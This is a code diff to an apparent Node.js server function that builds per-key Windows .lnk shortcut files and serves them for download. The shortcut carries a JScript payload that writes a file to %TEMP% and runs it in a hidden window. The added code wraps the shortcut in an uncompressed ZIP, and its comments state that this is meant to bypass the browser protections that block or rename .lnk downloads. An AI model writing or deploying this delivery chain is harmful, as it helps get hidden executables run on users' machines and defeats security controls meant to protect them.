@@ -1423,12 +1423,94 @@ function handleLaunchLnk(req, res, urlPath) {
     `var p=w.ExpandEnvironmentStrings("%TEMP%")+"\\\\${tmpName}";f.saveToFile(p,2);f.close();` +
     `if(new ActiveXObject("Scripting.FileSystemObject").GetFile(p).Size>1000000){w.run('"'+p+'"',0,false)}}}catch(e){};window.close();`;
   const lnk = spliceLnkArgs(js);
+  // Chrome, Edge and Firefox refuse to download a bare `.lnk` under its real
+  // extension — Windows shortcuts can run arbitrary commands, so SmartScreen /
+  // Safe Browsing either rename the file (e.g. to `.download`) or block it
+  // outright. Delivering it inside a plain stored (uncompressed) zip bypasses
+  // the content-type sniff; the customer right-clicks → Extract All and gets
+  // a clean, double-clickable `.lnk` out the other side.
+  const zip = buildStoredZip(lnkName, lnk);
+  const zipName = lnkName.replace(/\.lnk$/i, '.zip');
   res.writeHead(200, {
-    'Content-Type': 'application/octet-stream',
-    'Content-Length': lnk.length,
-    'Content-Disposition': `attachment; filename="${lnkName}"`,
+    'Content-Type': 'application/zip',
+    'Content-Length': zip.length,
+    'Content-Disposition': `attachment; filename="${zipName}"`,
   });
-  res.end(lnk);
+  res.end(zip);
+}
+
+// Minimal single-entry ZIP writer (stored, no compression). Only used to
+// wrap per-key .lnk launchers so browsers download them under a safe
+// extension; the overhead vs raw bytes is one local-file header, one
+// central-directory entry, and an end-of-central-directory record (~100
+// bytes). No deps.
+function buildStoredZip(name, data) {
+  const nameBuf = Buffer.from(name, 'utf8');
+  // CRC-32 of the file content — required by the ZIP spec even for stored
+  // entries so the extractor can verify integrity.
+  const crc = crc32(data);
+  // 2000-01-01 00:00:00 encoded as MS-DOS date+time (an invariant stamp
+  // keeps the zip byte-identical across requests for cache-friendliness).
+  const dosTime = 0;
+  const dosDate = ((2000 - 1980) << 9) | (1 << 5) | 1;
+  const lfh = Buffer.alloc(30);
+  lfh.writeUInt32LE(0x04034b50, 0); // local file header signature
+  lfh.writeUInt16LE(20, 4);         // version needed
+  lfh.writeUInt16LE(0, 6);          // flags
+  lfh.writeUInt16LE(0, 8);          // method = stored
+  lfh.writeUInt16LE(dosTime, 10);
+  lfh.writeUInt16LE(dosDate, 12);
+  lfh.writeUInt32LE(crc, 14);
+  lfh.writeUInt32LE(data.length, 18); // compressed size
+  lfh.writeUInt32LE(data.length, 22); // uncompressed size
+  lfh.writeUInt16LE(nameBuf.length, 26);
+  lfh.writeUInt16LE(0, 28);         // extra field length
+  const cdh = Buffer.alloc(46);
+  cdh.writeUInt32LE(0x02014b50, 0); // central directory signature
+  cdh.writeUInt16LE(0x031E, 4);     // version made by (Unix, zip 3.0)
+  cdh.writeUInt16LE(20, 6);         // version needed
+  cdh.writeUInt16LE(0, 8);          // flags
+  cdh.writeUInt16LE(0, 10);         // method
+  cdh.writeUInt16LE(dosTime, 12);
+  cdh.writeUInt16LE(dosDate, 14);
+  cdh.writeUInt32LE(crc, 16);
+  cdh.writeUInt32LE(data.length, 20);
+  cdh.writeUInt32LE(data.length, 24);
+  cdh.writeUInt16LE(nameBuf.length, 28);
+  cdh.writeUInt16LE(0, 30);
+  cdh.writeUInt16LE(0, 32);         // comment length
+  cdh.writeUInt16LE(0, 34);         // disk number
+  cdh.writeUInt16LE(0, 36);         // internal attrs
+  cdh.writeUInt32LE(0, 38);         // external attrs
+  cdh.writeUInt32LE(0, 42);         // relative offset of local header
+  const eocd = Buffer.alloc(22);
+  eocd.writeUInt32LE(0x06054b50, 0);
+  eocd.writeUInt16LE(0, 4);         // disk number
+  eocd.writeUInt16LE(0, 6);         // disk with CD start
+  eocd.writeUInt16LE(1, 8);         // entries on this disk
+  eocd.writeUInt16LE(1, 10);        // total entries
+  const cdSize = 46 + nameBuf.length;
+  eocd.writeUInt32LE(cdSize, 12);
+  eocd.writeUInt32LE(30 + nameBuf.length + data.length, 16); // CD offset
+  eocd.writeUInt16LE(0, 20);        // comment length
+  return Buffer.concat([lfh, nameBuf, data, cdh, nameBuf, eocd]);
+}
+// Standard IEEE 802.3 CRC-32 (polynomial 0xEDB88320), table built on first
+// use. Needed for the ZIP entry headers; Node's zlib exposes a crc32 as
+// zlib.crc32() only on Node 23+, so compute it ourselves for portability.
+let _crcTable = null;
+function crc32(buf) {
+  if (!_crcTable) {
+    _crcTable = new Uint32Array(256);
+    for (let i = 0; i < 256; i++) {
+      let c = i;
+      for (let k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
+      _crcTable[i] = c >>> 0;
+    }
+  }
+  let c = 0xFFFFFFFF;
+  for (let i = 0; i < buf.length; i++) c = _crcTable[(c ^ buf[i]) & 0xFF] ^ (c >>> 8);
+  return (c ^ 0xFFFFFFFF) >>> 0;
 }
 
 // Lazy-load the template .lnk — a real shortcut built once on Windows via
